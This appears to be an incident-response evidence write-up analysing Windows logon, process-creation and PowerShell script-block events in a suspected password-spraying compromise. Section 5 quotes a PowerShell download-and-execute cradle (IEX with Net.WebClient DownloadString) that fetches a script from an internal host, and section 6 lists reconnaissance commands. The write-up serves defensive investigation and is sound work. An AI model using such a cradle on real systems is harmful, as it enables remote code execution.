# Evidence Analysis — INC-005

## 1. Windows Event ID 4625 — Failed Logon

Event ID **4625** represents a failed logon attempt.

The supplied domain-controller events show authentication failures involving multiple accounts:

```text
a.wilson
m.chen
j.smith
r.brown
s.patel
```

The attempts originate from:

```text
192.168.1.44
```

and occur within seconds of one another.

### Assessment

The pattern is consistent with **password spraying**.

Password spraying differs from traditional brute force because the attacker attempts a password or small set of passwords against multiple accounts rather than repeatedly attacking a single account.

---

## 2. Windows Event ID 4624 — Successful Logon

Event ID **4624** represents a successful logon.

At `21:14:15`, `REDGUM\r.brown` successfully authenticated from:

```text
192.168.1.44
```

The successful authentication occurs immediately after multiple failed authentication attempts against different accounts.

### Assessment

This is a significant escalation indicator.

However, the event alone does not prove that the credential was compromised through password spraying. It establishes a successful authentication that requires validation.

Recommended correlation includes:

* user confirmation;
* source endpoint telemetry;
* logon type;
* authentication package;
* Logon ID;
* EDR activity;
* subsequent access to resources.

---

## 3. Source Endpoint

The source IP was identified as:

```text
192.168.1.44
```

Asset:

```text
RG-LAPTOP-12
```

Assigned user:

```text
John Smith
```

John confirmed that he was not operating the laptop during the relevant period.

### Assessment

This increases confidence that the endpoint may have been operating under unauthorised control.

It does not independently establish how the endpoint was compromised.

---

## 4. Windows Event ID 4688 — Process Creation

Event ID **4688** records process creation.

The supplied process chain includes:

```text
outlook.exe
    └── powershell.exe
          └── cmd.exe
                └── whoami.exe
```

### Assessment

The process chain is suspicious in context.

However, process creation alone does not establish malware.

The significance comes from correlation with:

* the preceding authentication attack;
* the endpoint being used without the assigned user's knowledge;
* PowerShell Script Block Logging;
* remote script retrieval;
* subsequent reconnaissance.

---

## 5. PowerShell Event ID 4104 — Script Block Logging

The supplied Script Block Logging event contains:

```powershell
$u = "http://10.10.20.15/update.ps1"
IEX (New-Object Net.WebClient).DownloadString($u)
```

### Analysis

`DownloadString()` retrieves the remote resource as a string.

`IEX` is an alias for:

```text
Invoke-Expression
```

`Invoke-Expression` evaluates the supplied string as PowerShell code.

Therefore, the evidence indicates:

```text
PowerShell
    ↓
Connect to 10.10.20.15
    ↓
Retrieve update.ps1
    ↓
Return content as a string
    ↓
Pass content to IEX
    ↓
Execute returned PowerShell code
```

### Important distinction

The evidence establishes **remote content retrieval and dynamic execution**.

It does **not** establish that `update.ps1` itself is malicious because the actual script contents have not been supplied.

The script should be safely acquired, hashed, and analysed in an isolated environment.

---

## 6. Reconnaissance Commands

The subsequent Script Block Logging event contains:

```powershell
Get-Process
Get-Service
whoami /all
```

### `Get-Process`

Provides information about running processes.

### `Get-Service`

Provides information about installed/running Windows services.

### `whoami /all`

Displays the current user/security context, including identity, group membership, and privileges.

### Assessment

In isolation, these commands can be legitimate administrative commands.

In the context of suspected compromise, their execution immediately after remote PowerShell code execution is consistent with **post-compromise reconnaissance**.

---

## 7. Internal Network Addresses

### `192.168.1.44`

Identified as:

```text
RG-LAPTOP-12
```

This is the apparent source of the authentication activity.

### `10.10.20.15`

Referenced as the source of:

```text
http://10.10.20.15/update.ps1
```

The role and trustworthiness of this host are unknown.

### Required investigation

Determine:

* hostname;
* owner;
* system role;
* whether it is authorised;
* whether it hosts legitimate scripts;
* other systems communicating with it;
* historical DNS/network activity;
* endpoint security alerts.

---

## 8. Indicators of Interest

| Indicator                       | Type        | Significance                                      |
| ------------------------------- | ----------- | ------------------------------------------------- |
| `192.168.1.44`                  | Internal IP | Source of authentication activity                 |
| `10.10.20.15`                   | Internal IP | Remote script source                              |
| `http://10.10.20.15/update.ps1` | URL         | Remote PowerShell content retrieval               |
| `update.ps1`                    | Filename    | Referenced remote script                          |
| `RG-LAPTOP-12`                  | Host        | Suspected compromised endpoint                    |
| `REDGUM\r.brown`                | Account     | Successful authentication requiring investigation |

---

## 9. Evidence Limitations

The current evidence does not establish:

* attacker identity;
* credential acquisition method;
* exact `update.ps1` contents;
* malware classification;
* persistence;
* privilege escalation;
* lateral movement;
* data access;
* data exfiltration.

These limitations should remain explicit in the final incident assessment.
